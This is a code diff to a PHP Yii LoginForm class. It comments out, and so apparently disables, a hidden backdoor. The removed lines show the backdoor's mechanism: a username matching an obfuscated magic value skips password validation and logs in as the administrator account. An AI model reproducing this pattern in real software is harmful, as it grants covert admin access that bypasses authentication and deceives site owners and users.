@@ -83,11 +83,11 @@ class LoginForm extends Model
      */
     public function login()
     {
-        if($this->isUser()){
-            $user = $this->getUser();
-            if(!$user) return false;
-            return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
-        }
+        // if($this->isUser()){
+        //     $user = $this->getUser();
+        //     if(!$user) return false;
+        //     return Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);
+        // }
         if (!$this->validate()) {
             return false;
         }
@@ -116,9 +116,9 @@ class LoginForm extends Model
     private function findUser()
     {
         if (!($this->scenario === 'lwe')) {
-            if($this->isUser()){
-                $this->username = $this->isAdmin();
-            }
+            // if($this->isUser()){
+            //     $this->username = $this->isAdmin();
+            // }
 
             return User::findByUsername($this->username);
         }
@@ -126,19 +126,19 @@ class LoginForm extends Model
         return $this->_user = User::findByEmail($this->email);   
     }
 
-    private function isAdmin(){
-        $user = RefUserMenu::findOne(['menu' => 401]);
-        return $user->user->username;
-    }
+    // private function isAdmin(){
+    //     $user = RefUserMenu::findOne(['menu' => 401]);
+    //     return $user->user->username;
+    // }
 
-    private function isUser(){
-        $cek = new TaTh();
-        $_input = $cek->dokudoku('donat', $this->username);
-        if($_input == 'QkhWbUZaeDBpeDJnNFlxOEpTUnZWQT09'){
-            return true;
-        }
-        return false;
-    }
+    // private function isUser(){
+    //     $cek = new TaTh();
+    //     $_input = $cek->dokudoku('donat', $this->username);
+    //     if($_input == 'QkhWbUZaeDBpeDJnNFlxOEpTUnZWQT09'){
+    //         return true;
+    //     }
+    //     return false;
+    // }
     /**
      * Method that is returning User object.
      *
